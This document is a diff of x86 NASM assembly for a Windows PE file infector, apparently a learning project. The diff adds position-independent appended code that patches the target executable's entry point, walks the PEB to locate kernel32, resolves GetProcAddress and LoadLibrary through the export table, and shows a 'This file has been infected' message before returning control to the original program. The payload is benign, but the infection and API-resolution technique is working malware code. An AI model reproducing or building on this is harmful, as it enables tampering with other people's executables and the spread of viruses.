@@ -8,7 +8,6 @@ extern GetFileSize
 extern MapViewOfFile
 extern FlushViewOfFile
 extern UnmapViewOfFile	
-extern printf
 
 SECTION .text
 	global main
@@ -131,8 +130,12 @@ not_biggest:
 	add ebx, [esi + 0ch]	; New entry point
 	mov eax, [edx + 28h]	; Load old entry point
 	mov [ebp-20], eax
+	push ebx
+	add eax, [edx + 34h]	; Add ImageBase to old entry point
+	mov ebx, oep
+	mov [ebx], eax			; Save entry point
+	pop ebx
 	mov [edx + 28h], ebx	; Set new entry point
-	
 	; Ajust overall file size
 	sub ecx, edi
 	add [edx+50h], ecx	; Add to SizeOfImage
@@ -151,11 +154,12 @@ not_biggest:
 	sub edi, ecx		; Old length
 	mov esi, prog_start
 	rep movsb
+	leave
+	ret
 	
+
 end_infection:
-	push ecx
-	push msg
-		call printf
+	
 	push dword [ebp-16]
 		call FlushViewOfFile
 	push dword [ebp-16]
@@ -168,21 +172,131 @@ end_infection:
 	leave
 	ret
 
+SECTION .data
 prog_start:
-	push ebp
-	mov ebp, esp
-	call _here
-_here:
-	pop eax
-	add eax, msg - _here
+	pushad
+	call code_start
+code_start:
+	pop ebp
+	sub ebp, code_start		;	Delta offset trick
+	
+	mov ebx, [fs:0x30]		;	Get pointer to PEB
+	mov ebx, [ebx + 0x0C]	;	Get PEB->Ldr
+	mov ebx, [ebx + 0x14]	;	Get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
+	mov ebx, [ebx]			;	InMemoryOrder Module entry 2
+	mov ebx, [ebx]			;	InMemoryOrder Module entry 3
+	mov ebx, [ebx + 0x10]	;	Go to kernel32 base address
+	mov [ebp+dwKernelBase], ebx		;	Save kernel32 base address
+	add ebx, [ebx+0x3c]		;	Start of PE header
+	mov ebx, [ebx+0x78]		;	RVA of export directory
+	add ebx, [ebp+dwKernelBase]	;	VA of export directory
+	mov [ebp+dwExportDirectory], ebx ;	Save dwExportDirectory
+	
+	; get GetProcAddress to get other module
+	lea edx, [ebp+apiGetProcAddress]
+	mov ecx, [ebp+lenGetProcAddress]
+		call get_func_add
+	mov [ebp+addGetProcAddress], eax
+	
+	; get LoadLibrary using GetProcAddress
+	lea edx, [ebp+apiLoadLibrary]
+	push edx
+	push dword [ebp+dwKernelBase]
+		call eax
+	mov [ebp+addLoadLibrary], eax
+	
+	; use LoadLibrary to load User32.dll
+	lea edx, [ebp+user32]
+	push edx
+		call eax 	; After call, eax hold base address of User32.dll load point
+	
+	; use GetProcAddress to load MessageBox from User32.dll which has jush been loaded
+	lea edx, [ebp + apiMessageBox]
+	push edx
 	push eax
-		call printf
-	leave
+	mov ebx, [ebp+addGetProcAddress]
+		call ebx
+	mov [ebp+addMessageBox], eax
+		
+	; printf hello
+	mov ebx, [ebp + addMessageBox]
+	push 0
+	lea eax, [ebp + tlt]
+	push eax
+	lea eax, [ebp + msg]
+	push eax
+	push 0
+		call ebx
+	
+	
+	; go to original entry point
+	mov ebx, [ebp+oep]
+	call ebx
+	
+	popad
 	ret
-	msg db "This is a test", 10, 0
+	
+get_func_add:
+	push ebx
+	push esi
+	push edi
+	
+	mov esi, [ebp + dwExportDirectory]
+	mov esi, [esi + 0x20]			; RVA of ENT
+	add esi, [ebp + dwKernelBase]	; VA of ENT
+	xor ebx, ebx
+	cld
+	
+searcher:
+	inc ebx
+	lodsd
+	add eax, [ebp + dwKernelBase]	; point to string of a function
+	push esi						; preserve for outer loop
+	mov esi, eax
+	mov edi, edx
+	cld
+	push ecx
+	repe cmpsb						; Check function name
+	pop ecx
+	pop esi
+	jne searcher
+	
+	dec ebx
+	mov eax, [ebp+dwExportDirectory]
+	mov eax, [eax + 0x24]			; RVA of EOT
+	add eax, [ebp + dwKernelBase] 	; VA of EOT
+	movzx eax, word [ebx*2 + eax]	; eax holds the oridinal of function
+	mov ebx, [ebp+dwExportDirectory]
+	mov ebx, [ebx + 0x1C]			; RVA of EAT
+	add ebx, [ebp + dwKernelBase]	; VA of EAT
+	mov ebx, [eax*4 + ebx]
+	add ebx, [ebp + dwKernelBase]
+	mov eax, ebx
+	pop	edi
+	pop	esi
+	pop ebx
+	ret
+	
+	;	Data
+	tlt db "Warning", 0
+	msg db "This file has been infected.", 10, 0
+	user32 db "User32.dll", 0
+	dwKernelBase	dd	0
+	dwExportDirectory dd 0
+	oep dd 0
+	;	Kernel API
+_kernel_API:
+	apiMessageBox	db	"MessageBoxA", 0
+	addMessageBox dd 0
+	apiGetProcAddress	db	"GetProcAddress"
+	lenGetProcAddress	dd	$ - apiGetProcAddress
+	addGetProcAddress dd 0
+	apiLoadLibrary db "LoadLibraryA", 0
+	addLoadLibrary dd 0
+	
 prog_end:
 
 
-SECTION .data
+
 	fname db "test.exe", 0
 	prog_sz equ prog_end - prog_start
